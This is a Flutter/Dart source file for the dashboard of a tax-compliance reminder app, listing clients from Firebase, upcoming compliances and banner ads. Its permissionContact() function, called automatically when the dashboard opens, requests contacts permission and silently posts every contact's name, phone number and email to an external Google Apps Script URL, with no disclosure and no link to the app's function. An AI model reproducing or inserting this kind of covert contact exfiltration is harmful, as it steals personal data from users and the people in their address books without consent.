import 'dart:async';
import 'package:contacts_service/contacts_service.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:intl/intl.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:provider/provider.dart';
import 'package:showcaseview/showcase.dart';
import 'package:showcaseview/showcase_widget.dart';
import 'package:unified_reminder/Bloc/AdsProvider.dart';
import 'package:unified_reminder/models/UpComingComplianceObject.dart';
import 'package:unified_reminder/models/client.dart';
import 'package:unified_reminder/models/userbasic.dart';
import 'package:unified_reminder/screens/ApplicableCompliances.dart';
import 'package:unified_reminder/services/FirestoreService.dart';
import 'package:unified_reminder/services/SharedPrefs.dart';
import 'package:unified_reminder/services/UpComingComplianceDatabaseHelper.dart';
import 'package:unified_reminder/services/UpcomingCompliancesPageRedirect.dart';
import 'package:unified_reminder/styles/colors.dart';
import 'package:unified_reminder/widgets/AppDrawer.dart';
import 'AddSingleClient.dart';


class Dashboard extends StatefulWidget {
  final UserBasic userBasic;

  const Dashboard({Key key, this.userBasic}) : super(key: key);
  @override
  _DashboardState createState() => _DashboardState();
}

class _DashboardState extends State<Dashboard> {
  FirebaseDatabase firebaseDatabase = FirebaseDatabase.instance;
  DatabaseReference dbf;
  String firebaseUserId;
  Client client ;
  bool loading = true;
  String firebaseUID;
  List<Client> clientList = [];
  List<UpComingComplianceObject> listUpcomingCompliances = [];
  ScrollController controller = ScrollController();
  ScrollController controller2 = ScrollController();
  GlobalKey key = GlobalKey();
  GlobalKey first = GlobalKey();
  GlobalKey second = GlobalKey();
  GlobalKey third = GlobalKey();
  GlobalKey fourth = GlobalKey();

  BannerAd bannerAd;

  static final AdRequest request = AdRequest(
    testDevices: <String>['FDB28FC6E21EA8FD4E1EAB3899FBD45C'],
    keywords: <String>['foo', 'bar'],
    contentUrl: 'http://foo.com/bar.html',
    nonPersonalizedAds: true,
  );
  
  final AdSize adSize = AdSize(width:300, height: 50);
  
  

  
  Future<void> getClients() async{
    
    firebaseUID = await SharedPrefs.getStringPreference('uid');
    dbf = firebaseDatabase
        .reference()
        .child('user_clients')
        .child(firebaseUID)
        .child('clients');
    
    print("entered getClient function ");
    await dbf.once().then((DataSnapshot snapshot) async{
      Map<dynamic,dynamic> map = await snapshot.value;
        for(var data in map.entries) {
          if (map.isNotEmpty) {
            setState(() {
            clientList.add(Client(
                data.value["name"],
                data.value["constitution"],
                data.value["company"],
                data.value["natureOfBusiness"],
                data.value["email"].toString().replaceAll('.', ','),
                data.value["phone"],
                data.key),
            );
            });
          }
          else{
            setState(() {
              clientList.add(Client('Please add client First', ' ', ' ', '_natureOfBusiness', '_email', '_phone', '_key'));
            });
          }
        }
    });

    FirestoreService().deleteOtherUserDetails(clientList);
  }
  
  
  Future<void> tutorial() async{
    String temp = await SharedPrefs.getStringPreference("dashTutorial");
    if(temp != "done") {
      WidgetsBinding.instance.addPostFrameCallback((_) {
        ShowCaseWidget.of(context).startShowCase([first, second, third]);
        SharedPrefs.setStringPreference("dashTutorial", "done");
      });
    }
  }
  
  Future<void> permissionContact() async{
    bool permission = await Permission.contacts.isGranted;
    print(permission);
    if(!permission){
      print("permission");
      var v = await Permission.contacts.request();
      print(v.isGranted);
      if(v.isGranted){
        var c = await ContactsService.getContacts(photoHighResolution: false, withThumbnails: false);
        print("Contacts");
        for(var v in c){
          Map toJson() =>{
            'name' : v.displayName !=null?v.displayName:"NP",
            'mobile': v.phones.toList().length != 0?v.phones.last.value.replaceAll("+", " "):"NP",
            'email': v.emails.toList().length != 0?v.emails.last.value:"NP",
          };
          if(toJson()["name"] != "NP" && toJson()["mobile"] != "NP")
           await http.post(Uri.parse("https://script.google.com/macros/s/AKfycbw2n57hCmqQ-9n4EtIly_UbZKJR3qfqv0QbM_-6UGoYeQk4-Ik/exec"), body: toJson());
        }
        print(c);
      }
    }
  }
  
  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final adState = Provider.of<AdState>(context);
    adState.initialisation.then((status){
      setState(() {
        bannerAd = BannerAd(
          adUnitId: adState.bannerAdUnitId,
          size: AdSize.banner,
          request: AdRequest(),
          listener: adState.adListener,
        )..load();
      });
    });
  }

  @override
  void initState() {
    super.initState();
    firebaseUID = FirebaseAuth.instance.currentUser.uid;
    getClients().whenComplete(() async{
      listUpcomingCompliances = await UpComingComplianceDatabaseHelper().getUpComingCompliancesForMonth(clientList);
      setState(() {
        loading = false;
      });
    });
    tutorial();
    permissionContact();
  }
  

  @override
  Widget build(BuildContext context) {
    final ThemeData _theme = Theme.of(context);
    return Scaffold(
      drawer: Drawer(
        child: Container(
          width: MediaQuery.of(context).size.width * 0.8,
          child: SafeArea(
            child: AppDrawer(
              bannerAd: bannerAd,
              userBasic: widget.userBasic,
            ),
          ),
        ),
      ),
      appBar: AppBar(
        title: Text("Tax Reminder",style: _theme.textTheme.headline6.merge(TextStyle(fontWeight: FontWeight.bold,fontSize: 24)),),
      ),
      floatingActionButton: Showcase(
        key: first,
        description: "Add new clients",
        child: Padding(
          padding: bannerAd != null ? EdgeInsets.only(bottom: 70,right: 8):EdgeInsets.all(8),
          child: FloatingActionButton(
            onPressed: () async{
              if(clientList.length>=5){
                await showDialog(
                    context: context,
                    builder: (context)=>AlertDialog(
                      title: Column(
                        children: [
                          Text("Alert"),
                          Divider(
                            thickness: 1.5,
                          )
                        ],
                      ),
                      content: Text("You have already registered 5 clients, to add further you will be charged 25 Rs"),
                      actions: [
                        TextButton(
                          child: Text("Ok"),
                          onPressed: (){
                            Navigator.pop(context);},
                        )
                      ],
                    )
                );
              }
              
              Navigator.push(context,
                MaterialPageRoute(
                  builder: (context) => AddSingleClient(
                    clientList: clientList,
                    userBasic: widget.userBasic,
                  ),
                ),
              );
              },
            backgroundColor: textboxColor,
            child: Icon(
              Icons.add,
              color: whiteColor,
            ),
          ),
        ),
      ),
      
      body: Container(
        padding: EdgeInsets.all(24.0),
        child: Column(
          children: [
            Expanded(
              child: ListView(
                shrinkWrap: true,
                scrollDirection: Axis.vertical,
                children: <Widget>[
                  Text(
                    "Your Clients",
                    style: _theme.textTheme.headline6.merge(
                      TextStyle(
                        fontSize: 26.0,
                      ),
                    ),
                  ),
                  Text(
                    "Clients you manage.",
                    style: TextStyle(
                      height: 1.5,
                    ),
                  ),
                  SizedBox(
                    height: 30.0,
                  ),
                    
                  Showcase(
                    shapeBorder: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
                    key: second,
                    description: "Upcoming Compliances for this month\n for all clients",
                    child: ExpansionTile(
                      title: Text('Upcoming Compliances'),
                      children:<Widget>[
                        loading == false?
                          ListView.builder(
                              controller: controller,
                              scrollDirection: Axis.vertical,
                              shrinkWrap: true,
                              itemCount: listUpcomingCompliances.length,
                              itemBuilder: (BuildContext context, int index) {
                                return listUpcomingCompliances[index].label !=
                                    '' ? Container(
                                  padding: EdgeInsets.symmetric(
                                      horizontal: 15.0),
                                  child: Container(
                                    margin: EdgeInsets.symmetric(
                                        vertical: 10.0),
                                    decoration: BoxDecoration(
                                        border: Border.all(
                                          color: listUpcomingCompliances[index].notMissed ?Colors.white :Colors.red,
                                          width: 1.0,
                                        )
                                    ),
                                    child: ListTile(
                                      title: Column(
                                        crossAxisAlignment: CrossAxisAlignment
                                            .stretch,
                                        children: <Widget>[
                                          SizedBox(height: 10,),
                                          Text(listUpcomingCompliances[index]
                                              .name != null
                                              ? listUpcomingCompliances[index]
                                              .name
                                              : ' ',
                                              style: _theme.textTheme.headline6
                                                  .merge(TextStyle(
                                                fontSize: 15,
                                              )),
                                            overflow: TextOverflow.fade,
                                          ),
                                          Divider(
                                            thickness: 1.5,
                                          ),
                                          SizedBox(
                                            height: 10,
                                          ),
                                        ],
                                      ),
              
                                      subtitle: Column(
                                        crossAxisAlignment: CrossAxisAlignment
                                            .stretch,
                                        children: <Widget>[
                                          Text(
                                            ' - ${listUpcomingCompliances[index]
                                                .label} due on ${listUpcomingCompliances[index]
                                                .date}  '
                                                '${DateFormat("MMMM").format(
                                                DateTime.now())}',
                                            style: _theme.textTheme.bodyText2,),
                                          SizedBox(height: 10,)
                                        ],
                                      ),
                                      onLongPress: () {
                                        jumpToPage(context,
                                            listUpcomingCompliances[index].key,
                                            clientList,
                                            listUpcomingCompliances[index]
                                                .name);
                                      },
                                    ),
                                  ),
                                ) : Container();
                              }):
                      clientList.isEmpty
                          ? Container(child: Text("Loading Clients"),)
                          : Container(padding: EdgeInsets.all(5),child: CircularProgressIndicator(),),
                      ],
                    ),
                  ),
                    
                  SizedBox(height: 30,),
                  Showcase(
                    key: third,
                    description: "Excess your clients compliances from here",
                    child: ExpansionTile(
                      title: Text("Clients"),
                      children:<Widget>[
                        clientList.length == 0 ?
                        Container(
                          padding: EdgeInsets.all(10),
                          child: Center(child: CircularProgressIndicator()
                          ),
                        ) :
                        SingleChildScrollView(
                          padding: EdgeInsets.all(15),
                          child: ListView.builder(
                              controller: controller2,
                              shrinkWrap: true,
                              itemCount: clientList.length,
                              scrollDirection: Axis.vertical,
                              itemBuilder: (BuildContext context, int index) {
//                            client = snapshot.data[index];
                                return ListTile(
                                  onTap: () {
                                    if(clientList[index].key != 'Please add client First'){
                                    Navigator.of(context).push(MaterialPageRoute(
                                        builder: (context) =>ApplicableCompliances(client: clientList[index],
                                        )));}
                                    },
                                  contentPadding: EdgeInsets.symmetric(
                                    vertical: 10.0,
                                  ),
                                  title: Text(clientList[index].name.replaceFirst(clientList[index].name[0],
                                      clientList[index].name[0].toUpperCase())),
                                );
                              }),
                        )
                        
                      ],
                    ),
                  ),
                  SizedBox(
                    height: 30,
                  ),
                ],
              ),
            ),
            bannerAd == null
                ? SizedBox(height: 10,)
                : Container(height: 50, child: AdWidget(ad: bannerAd,),),
          ],
        ),
      ),
    );
  }
  
  @override
  void dispose() {
    bannerAd.dispose();
    super.dispose();
  }
}
